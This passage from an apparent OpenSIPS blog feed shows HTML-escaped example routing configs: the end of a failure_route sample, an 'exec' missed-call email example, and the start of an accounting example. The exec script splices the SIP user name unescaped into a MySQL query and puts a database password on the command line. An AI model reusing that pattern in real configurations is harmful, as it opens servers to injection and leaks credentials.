&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;failure_route[1]&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;(isflagset(1))&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;log(1, &amp;#34;failure&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; flag set\n&amp;#34;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		log&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;failure: flag unset\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>exec</title>
      <link>https://wdd.js.org/opensips/ch8/exec/</link>
      <pubDate>Thu, 28 May 2020 09:58:09 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch8/exec/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-makefile&#34; data-lang=&#34;makefile&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# $Id$
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# simple quick-start config script
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# ----------- global configuration parameters ------------------------
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#set module path
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;mpath&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/local/lib/opensips/modules/&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sl.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;usrloc.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;registrar.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;exec.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# ----------------- setting module-specific parameters ---------------
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;route{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# uri for my domain ?
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_myself&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$rd&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$rm&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;REGISTER&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			save&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;location&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# native SIP destinations are handled using our USRLOC DB&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!lookup&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;location&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# proceed to email notification&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$rm&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;INVITE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;404&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Not Found&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# user found, forward to his current uri now&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!t_relay&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		sl_reply_error&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/*&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;handling&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;missed&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;calls&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;*/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;route[1]&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# don&amp;#39;t continue if it is a retransmission
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; !t_newtran&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		sl_reply_error&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# external script: lookup user, if user exists, send &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# an email notification to him&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!exec_msg&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;		QUERY=&amp;#34;select email_address from subscriber 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;			where user=\&amp;#34;$$SIP_OUSER\&amp;#34;&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;		EMAIL=`mysql  -Bsuser -pheslo -e &amp;#34;$$QUERY&amp;#34; ser`;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;		if [ -z &amp;#34;$$EMAIL&amp;#34; ] ; then exit 1; fi ;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;		echo &amp;#34;SIP request received from $$SIP_HF_FROM for $$SIP_OUSER&amp;#34; |
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;		mail -s &amp;#34;request for you&amp;#34; $$EMAIL &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# exec returned error ... user does not exist&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# send a stateful reply&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		t_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;404&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;User does not exist&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		t_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;600&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;No messages for this user&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>acc</title>
      <link>https://wdd.js.org/opensips/ch8/acc/</link>
      <pubDate>Thu, 28 May 2020 09:57:46 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch8/acc/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-makefile&#34; data-lang=&#34;makefile&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# $Id$
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# example: accounting calls to nummerical destinations
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# ------------------ module loading ----------------------------------
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#set module path
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;mpath&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/local/lib/opensips/modules/&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;acc.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sl.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;maxfwd.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rr.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# ----------------- setting module-specific parameters ---------------
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# -- acc params --
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# set the reporting log level
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;modparam(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;acc&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;log_level&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;1)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# number of flag, which will be used for accounting; if a message is
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# labeled with this flag, its completion status will be reported
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;modparam(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;acc&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;log_flag&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# -------------------------  request routing logic -------------------
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# main routing logic
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;route{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
